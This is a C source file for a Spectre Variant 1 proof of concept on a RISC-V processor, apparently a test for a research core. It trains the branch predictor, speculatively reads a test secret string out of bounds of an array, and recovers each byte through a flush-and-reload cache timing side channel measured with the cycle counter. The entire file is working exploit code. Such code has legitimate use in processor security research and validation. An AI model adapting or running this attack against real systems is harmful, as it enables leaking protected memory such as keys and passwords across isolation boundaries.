#include <stdio.h>
#include <stdint.h> 
#include "encoding.h"
#include "cache.h"

#define TRAIN_TIMES 64 // emprically chosen
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#define SECRET_SZ 31
#define CACHE_HIT_THRESHOLD 50

#define ARRAY_STRIDE L1_BLOCK_SZ_BYTES


uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
//uint8_t array2[256 * 4096];
char* secretString = "!\"#ThisIsTheBabySonicBoomerTest";

#define read_csr(reg) ({ unsigned long __tmp; \
  asm volatile ("csrr %0, " #reg : "=r"(__tmp)); \
  __tmp; })


/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void victimFunc(uint64_t idx){
    uint8_t dummy = 2;
    

    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    array1_sz =  array1_sz << 4;
//    //flushCache(array1_sz, sizeof(array1_sz));
    asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");

    if (idx < array1_sz){
        //dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
        //temp &= array2[array1[idx] * L1_BLOCK_SZ_BYTES];
        temp &= array2[array1[idx] * ARRAY_STRIDE];
    }

    // bound speculation here just in case it goes over
    //dummy = read_csr(cycle);
}

int main(void){
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    register uint64_t start, diff; 
    register uint64_t start_ov, diff_ov; 
    uint64_t passInIdx, randIdx, mix_i;
    unsigned int dummy = 0;
    static uint64_t results[256];
    volatile uint8_t * addr;
    
    for (int i = 0; i < (int)sizeof(array2); i++) {
      array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    }

  
    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
        //start_ov = read_csr(cycle);
        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){

            // make sure array you read from is not in the cache
            //flushCache((uint64_t)array2, sizeof(array2));
	    randIdx = atkRound % array1_sz;
            flushCache((uint64_t)array2, sizeof(array2));

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-2; j >= 0; --j){
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                /* Delay (act as mfence) */                
                for(volatile int k = 0; k < 100; ++k){
                    asm("");
                }
                
                // passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                // passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                // passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
                passInIdx = ((j % 6) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx                 

                // call function to train or attack
                victimFunc(passInIdx);
            }
            
            // read out array 2 and see the hit secret value            
            /* Time reads. Order is lightly mixed up to prevent stride prediction */
            for (int i = 0; i < 256; i++) {
                mix_i = ((i * 167) + 13) & 255;
                //addr = & array2[mix_i * L1_BLOCK_SZ_BYTES];
                addr = & array2[mix_i * ARRAY_STRIDE];
                
                /*
                We need to accuratly measure the memory access to the current index of the
                array so we can determine which index was cached by the malicious mispredicted code.
                The best way to do this is to use the read_csr instruction, which measures current
                processor ticks, and is also serialized.
                */                             
                start = read_csr(cycle); /* READ TIMER */
                dummy = * addr; /* MEMORY ACCESS TO TIME */
                diff = (read_csr(cycle) - start); /* READ TIMER & COMPUTE ELAPSED TIME */
                
                if ((uint64_t)diff < CACHE_HIT_THRESHOLD && mix_i != array1[atkRound % array1_sz]){
                  results[mix_i]++; /* cache hit - add +1 to score for this value */
                }            
            }
        } 
        // get highest and second highest result hit values
        results[0] ^= dummy; /* use junk so code above wont get optimized out*/
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

	//diff_ov = read_csr(cycle) - start_ov;
        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
	//printf("DIFF OV:%lu\n",diff_ov);

        // read in the next secret 
        ++attackIdx;
    }

    return 0;
}
